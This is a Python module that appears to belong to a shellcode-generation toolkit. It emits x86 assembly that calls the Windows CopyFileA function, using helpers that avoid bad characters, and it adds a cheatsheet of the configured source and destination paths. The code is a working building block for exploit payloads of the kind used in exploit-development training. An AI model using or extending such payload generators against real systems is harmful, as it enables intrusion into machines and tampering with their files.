"""Copy-file payload template.

Requires: CopyFileA
Strings: src_path, dst_path (mov method, pre-built at slots)
"""
from __future__ import annotations

from .base import PayloadTemplate, TemplateConfig
from ..encode import safe_lea, safe_call_mem


class CopyFileTemplate(PayloadTemplate):

    def emit(self, layout, config: TemplateConfig) -> str:
        copyfile_off = -layout.slot("CopyFileA").offset
        bc = config.badchars

        try:
            src_off = -layout.slot("src_path").offset
            dst_off = -layout.slot("dst_path").offset
        except KeyError as e:
            raise ValueError(
                f"CopyFileTemplate requires 'src_path' and 'dst_path' string slots. "
                f"Missing: {e}"
            ) from e

        return "\n".join([
            "; -- Copy File Payload --",
            "",
            "    ; CopyFileA(&src, &dst, bFailIfExists=FALSE)",
            *safe_lea("eax", "ebp", src_off, bc),
            *safe_lea("ebx", "ebp", dst_off, bc),
            "    xor  ecx, ecx             ; bFailIfExists = FALSE",
            "    push ecx",
            "    push ebx                  ; lpNewFileName",
            "    push eax                  ; lpExistingFileName",
            *safe_call_mem("ebp", copyfile_off, bc),
            "",
        ])

    def cheatsheet(self, config: TemplateConfig) -> list[tuple[str, str]]:
        return [
            ("Source path", config.src_path),
            ("Destination path", config.dst_path),
        ]
